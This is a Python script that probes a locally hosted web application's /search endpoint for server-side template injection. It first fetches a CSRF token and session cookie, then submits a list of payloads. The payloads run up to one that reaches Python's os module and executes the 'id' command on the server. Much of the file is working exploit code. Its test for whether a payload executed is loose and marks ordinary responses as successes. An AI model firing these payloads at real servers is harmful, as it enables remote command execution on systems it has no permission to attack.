import requests
import re
import json
import sys

# Configuration
base_url = "http://127.0.0.1:33077"
headers = {
    'Host': 'localhost',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
}

payloads = [
    "{{ 7*7 }}",
    "{{ config }}",
    "{{ 7*'7' }}",
    "{{''.__class__}}",
    "{{request.application.__globals__.__builtins__}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
]

print("[SSTI Testing] Starting SSTI tests on /search endpoint")
print(f"[Headers Config] Host: localhost, User-Agent: Mozilla/5.0")
print(f"[Target] {base_url}/search")

# Step 1: GET root page to extract CSRF token and session cookie
print("\n[1] GET root page to extract CSRF token and session cookie")
try:
    response = requests.get(base_url, headers=headers, timeout=15)
    print(f"[Response] Status: {response.status_code} | Length: {len(response.text)}B")
    
    csrf_token = None
    session_cookie = None
    
    # Extract CSRF token
    csrf_match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
    if csrf_match:
        csrf_token = csrf_match.group(1)
        print(f"[CSRF] Token extracted: {csrf_token[:20]}...")
    else:
        print("[CSRF] Token not found in response")
    
    # Extract session cookie
    session_cookie = response.cookies.get('sessionid')
    if session_cookie:
        print(f"[Session] Cookie extracted: {session_cookie[:20]}...")
    else:
        print("[Session] Cookie not found")
    
    cookies = {'sessionid': session_cookie} if session_cookie else {}
    
except Exception as e:
    print(f"[Error] Failed to GET root page: {e}")
    sys.exit(1)

# Step 2: Test each SSTI payload
print("\n[2] Testing SSTI payloads on /search endpoint")
results = []

for idx, payload in enumerate(payloads, 1):
    print(f"\n[Test {idx}] Payload: {payload}")
    
    post_data = {'search': payload}
    if csrf_token:
        post_data['csrfmiddlewaretoken'] = csrf_token
    
    try:
        response = requests.post(
            f"{base_url}/search",
            headers=headers,
            cookies=cookies,
            data=post_data,
            timeout=15
        )
        
        print(f"[Response] Status: {response.status_code} | Length: {len(response.text)}B")
        
        # Initialize analysis flags
        contains_49 = "49" in response.text
        payload_in_response = payload in response.text
        has_django_trace = "Traceback" in response.text or "django" in response.text.lower()
        has_disallowed_host = "DisallowedHost" in response.text
        
        # Determine execution status
        executed = False
        if contains_49 and idx == 1:
            executed = True
        elif not payload_in_response and "{{" not in response.text:
            executed = True
        elif has_django_trace:
            executed = True
        
        # Print analysis
        print(f"[Analysis] Contains '49': {contains_49}")
        print(f"[Analysis] Raw payload in response: {payload_in_response}")
        print(f"[Analysis] Has Django trace: {has_django_trace}")
        print(f"[Analysis] DisallowedHost error: {has_disallowed_host}")
        print(f"[Analysis] Likely executed: {executed}")
        
        # Print response snippet
        snippet = response.text[:800] if len(response.text) > 800 else response.text
        print(f"[Snippet] {snippet}")
        
        # Store result
        results.append({
            'payload_id': idx,
            'payload': payload,
            'status_code': response.status_code,
            'contains_49': contains_49,
            'payload_in_response': payload_in_response,
            'has_django_trace': has_django_trace,
            'has_disallowed_host': has_disallowed_host,
            'executed': executed,
            'response_length': len(response.text)
        })
        
    except Exception as e:
        print(f"[Error] Request failed: {e}")
        results.append({
            'payload_id': idx,
            'payload': payload,
            'error': str(e),
            'executed': False
        })

# Final summary
print("\n[3] Final Results Summary")
print(json.dumps(results, indent=2))

executed_count = sum(1 for r in results if r.get('executed', False))
filtered_count = len(payloads) - executed_count

print(f"\n[Summary] Executed: {executed_count} | Filtered/Failed: {filtered_count} | Total: {len(payloads)}")

# Detailed payload analysis
print("\n[4] Detailed Payload Analysis")
for r in results:
    status = "EXECUTED" if r.get('executed', False) else "FILTERED"
    print(f"[Payload {r['payload_id']}] {status}")
    if r.get('checks'):
        print(f"  Checks: {r['checks']}")
    if r.get('error'):
        print(f"  Error: {r['error']}")
